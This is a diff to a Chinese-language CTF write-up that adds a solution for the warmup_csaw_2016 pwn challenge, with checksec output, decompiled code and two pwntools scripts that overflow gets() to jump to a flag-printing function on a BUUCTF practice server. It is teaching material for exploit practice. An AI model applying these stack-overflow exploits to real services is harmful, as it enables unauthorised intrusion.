@@ -163,12 +163,12 @@ sh.interactive()
 新建一个`sh`对象，用于连接靶机以及操作靶机；
 
 > **remote()函数**：pwntools的核心函数，用于创建TCP连接
-
 `sendline()`向靶机发送payload;
 
 > **sendline()**：发送数据并在末尾自动添加 `\n`（0x0A）
-
 > 重要：因为原程序使用 `gets()` 函数，该函数以 `\n` 或 EOF 为结束标志
+
+>**interactive()**：作用：在攻击成功后进入交互式shell
 
 **发送内容**：
 
@@ -196,4 +196,105 @@ home
 var
 cat flag
 flag{7f35d897-a5fd-4505-84a7-2990b740f2d9}
+````
+
+## warmup_csaw_2016
+
+先`checksec`:
+
+````bash
+❯ checksec --file='/home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016'
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               /home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016
+````
+
+分析程序：
+
+````c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  char s[64]; // [rsp+0h] [rbp-80h] BYREF
+  char v5[64]; // [rsp+40h] [rbp-40h] BYREF
+
+  write(1, "-Warm Up-\n", 0xAuLL);
+  write(1, "WOW:", 4uLL);
+  sprintf(s, "%p\n", sub_40060D);
+  write(1, s, 9uLL);
+  write(1, ">", 1uLL);
+  return gets(v5);
+}
+````
+
+````c
+int sub_40060D()
+{
+  return system("cat flag.txt");
+}
+````
+
+和上面一道题差不多，还是利用`gets()`溢出，64+8=72，shellcode是`sub_40060D`，地址就位于`0x40060D`。
+
+所以，payload就是：
+
+````python
+payload = b'q'*72 + p64(0x40060D)
+````
+
+完整：
+
+````python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 29765
+sh = remote(host, port)
+payload = b'q'*72 + p64(0x40060D)
+sh.sendline(payload)
+sh.interactive()
+````
+直接得到了flag：
+
+````
+[*] Switching to interactive mode
+>flag{110426c9-307c-4a2e-b763-73e47ca4a4fb}
+timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
+````
+
+不过这道题其实应该不是这样做的。。因为主函数里`sprintf(s, "%p\n", sub_40060D)`是用来打印出shellcode函数地址的，但是它的`PIE`未启用，也就是每次的地址都是固定的，这个语句就毫无意义了。
+
+所以应该是这样的：
+
+`PIE`启用，每次运行时函数地址都是随机的，需要攻击者通过`sprintf(s, "%p\n", sub_40060D)`来获取shellcode函数地址，再通过`gets()`溢出进而执行shellcode。
+
+按照这个思路，再写一个脚本：
+
+````python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 29765
+
+sh = remote(host, port)
+print(sh.recvuntil("WOW:"))  # 接收直到出现"WOW:"
+location = sh.recvline().strip().decode("UTF-8") #获取到字节串，转化为字符串并去除\n
+print("函数地址：" + location)
+payload = b'a'*72 + p64(int(location, 16))  #p64()需传入int，所以把地址字符串转换为16进制的int
+sh.sendline(payload)
+sh.interactive()
+````
+
+得到flag：
+
+````
+d:\CTF\项目\BUU\pwn\warmup_csaw_2016\hack.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(sh.recvuntil("WOW:"))
+b'-Warm Up-\nWOW:'
+函数地址：0x40060d
+[*] Switching to interactive mode
+>flag{110426c9-307c-4a2e-b763-73e47ca4a4fb}
+timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
+[*] Interrupted
+[*] Closed connection to node5.buuoj.cn port 29765
 ````
